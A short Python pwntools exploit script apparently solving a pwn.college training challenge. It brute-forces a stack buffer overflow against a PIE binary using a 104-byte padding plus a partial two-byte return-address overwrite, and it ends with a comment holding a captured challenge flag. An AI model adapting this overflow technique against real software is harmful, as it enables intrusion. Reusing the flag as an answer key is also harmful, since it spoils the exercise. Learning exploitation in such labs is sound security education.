#!/usr/bin/env python3
from pwn import *

context.terminal = ['kitty', '-e']

exe = context.binary = ELF('./binary-exploitation-pie-overflow', checksec=False)
libc = exe.libc

gdbscript = '''
p win_authed 
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            pause()
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

for i in range(1000):
    p = exe.process()

    payload = flat(
        b'A' * 104,
        p16(0x5f53)
    )

    p.send(payload)

    output = p.recvall().decode()
    print(output)
    if ("kms{" in output):
        print(output)
        break

p.interactive()
#pwn.college{IaQU9ZM2r7e-rhItiSp7d2F1VgC.dJDMzwCMxADNwEzW}